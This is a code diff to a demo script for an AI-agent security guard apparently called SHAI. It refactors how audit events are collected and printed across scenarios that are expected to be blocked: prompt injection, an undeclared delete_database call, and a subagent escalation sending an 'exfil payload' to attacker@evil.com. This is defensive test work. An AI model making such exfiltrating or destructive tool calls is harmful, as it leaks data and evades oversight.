@@ -89,22 +89,22 @@ def print_outcome(allowed: bool, message: str) -> None:
 def print_note(text: str) -> None:
     print(f"  {c(YELLOW, '→')} {c(DIM, text)}")
 
-def print_audit_rows(events: list[dict]) -> None:
+def print_audit_rows(events: list) -> None:
     if not events:
         return
     print(f"  {c(BOLD, '│')}  {c(DIM, '─── SHAI audit ─────────────────────────────────')}")
     for ev in events:
         detail_parts = []
-        if ev.get("tool_name"):
-            detail_parts.append(f"tool={c(CYAN, ev['tool_name'])}")
-        if ev.get("finding_count", 0):
+        if ev.tool_name:
+            detail_parts.append(f"tool={c(CYAN, ev.tool_name)}")
+        if ev.finding_count:
             detail_parts.append(
-                f"findings={c(YELLOW, str(ev['finding_count']))}"
-                + (f" max={c(YELLOW, ev['max_severity'])}" if ev.get("max_severity") else "")
+                f"findings={c(YELLOW, str(ev.finding_count))}"
+                + (f" max={c(YELLOW, str(ev.max_severity))}" if ev.max_severity else "")
             )
-        if ev.get("deny_reason"):
-            detail_parts.append(c(RED, ev["deny_reason"]))
-        print_shai_row(ev["boundary"], ev["decision"], "  ".join(detail_parts))
+        if ev.deny_reason:
+            detail_parts.append(c(RED, ev.deny_reason))
+        print_shai_row(str(ev.boundary), str(ev.decision), "  ".join(detail_parts))
     print(f"  {c(BOLD, '│')}")
 
 
@@ -156,18 +156,17 @@ async def s01_clean_turn(h: SHAI, ctx: AgentContext) -> bool:
     print_attempt("scan input → call search_docs → scan result → scan output")
     print(f"  {c(BOLD, '│')}")
 
-    v = await h.scan_input("What is the vacation policy?", ctx)
+    with h.collect_events() as evts:
+        v = await h.scan_input("What is the vacation policy?", ctx)
+        if not v.blocked:
+            g  = await h.check_tool_call("search_docs", {"query": "vacation policy"}, ctx)
+            result = await _search_docs("vacation policy")
+            tv = await h.scan_tool_result(result, ctx)
+            ov = await h.scan_output("The vacation policy allows 20 days per year.", ctx)
     print_audit_rows(evts)
     if v.blocked:
         print_outcome(False, "Input unexpectedly blocked")
         return False
-
-    with h.collect_events() as evts:
-        g = await h.check_tool_call("search_docs", {"query": "vacation policy"}, ctx)
-        result = await _search_docs("vacation policy")
-        tv = await h.scan_tool_result(result, ctx)
-        ov = await h.scan_output("The vacation policy allows 20 days per year.", ctx)
-    print_audit_rows(evts)
 
     print_outcome(True, "Full turn completed — every boundary allowed")
     print_note("4 audit events emitted, 0 findings, no raw text logged")
@@ -180,7 +179,8 @@ async def s02_pii_input(h: SHAI, ctx: AgentContext) -> bool:
     print_attempt(f'user sends: "{c(YELLOW, msg)}"')
     print(f"  {c(BOLD, '│')}")
 
-    v = await h.scan_input(msg, ctx)
+    with h.collect_events() as evts:
+        v = await h.scan_input(msg, ctx)
     print_audit_rows(evts)
 
     if v.blocked:
@@ -197,7 +197,8 @@ async def s03_prompt_injection(h: SHAI, ctx: AgentContext) -> bool:
     print_attempt(f'attacker sends: "{c(YELLOW, attack[:55])}..."')
     print(f"  {c(BOLD, '│')}")
 
-    v = await h.scan_input(attack, ctx)
+    with h.collect_events() as evts:
+        v = await h.scan_input(attack, ctx)
     print_audit_rows(evts)
 
     if v.blocked:
@@ -213,7 +214,8 @@ async def s04_undeclared_tool(h: SHAI, ctx: AgentContext) -> bool:
     print_attempt(f'LLM requests: {c(CYAN, "delete_database")}(confirm=True)')
     print(f"  {c(BOLD, '│')}")
 
-    g = await h.check_tool_call("delete_database", {"confirm": True}, ctx)
+    with h.collect_events() as evts:
+        g = await h.check_tool_call("delete_database", {"confirm": True}, ctx)
     print_audit_rows(evts)
 
     print_outcome(not g.allowed, f"L1 hard gate: {g.deny_reason}")
@@ -230,11 +232,12 @@ async def s05_subagent_escalation(h: SHAI, ctx: AgentContext) -> bool:
     )
     print(f"  {c(BOLD, '│')}")
 
-    g = await h.check_tool_call(
-        "send_alert",
-        {"message": "exfil payload", "recipient": "attacker@evil.com"},
-        child,
-    )
+    with h.collect_events() as evts:
+        g = await h.check_tool_call(
+            "send_alert",
+            {"message": "exfil payload", "recipient": "attacker@evil.com"},
+            child,
+        )
     print_audit_rows(evts)
     print_outcome(not g.allowed, f"Escalation blocked — {g.deny_reason}")
 
@@ -304,7 +307,8 @@ async def s08_pii_in_args(h: SHAI, ctx: AgentContext) -> bool:
     )
     print(f"  {c(BOLD, '│')}")
 
-    g = await h.check_tool_call("write_file", args, ctx)
+    with h.collect_events() as evts:
+        g = await h.check_tool_call("write_file", args, ctx)
     print_audit_rows(evts)
 
     # write_file is denied by policy (write tag) before the arg scanner
@@ -328,11 +332,12 @@ async def s09_policy_deny(h: SHAI, ctx: AgentContext) -> bool:
     print(f"  {c(BOLD, '│')}  {c(DIM, 'Agent rule:  deny_write_by_default → action: deny')}")
     print(f"  {c(BOLD, '│')}")
 
-    g = await h.check_tool_call(
-        "send_alert",
-        {"message": "test alert", "recipient": "ops@company.com"},
-        ctx,
-    )
+    with h.collect_events() as evts:
+        g = await h.check_tool_call(
+            "send_alert",
+            {"message": "test alert", "recipient": "ops@company.com"},
+            ctx,
+        )
     print_audit_rows(evts)
 
     print_outcome(not g.allowed, f"Policy deny: {g.deny_reason}")
@@ -349,7 +354,8 @@ async def s10_subagent_isolation(h: SHAI, ctx: AgentContext) -> bool:
     )
     print(f"  {c(BOLD, '│')}")
 
-    g = await h.check_tool_call("write_file", {"path": "x", "content": "y"}, child)
+    with h.collect_events() as evts:
+        g = await h.check_tool_call("write_file", {"path": "x", "content": "y"}, child)
     print_audit_rows(evts)
 
     print_outcome(not g.allowed, f"L1 hard gate: {g.deny_reason}")
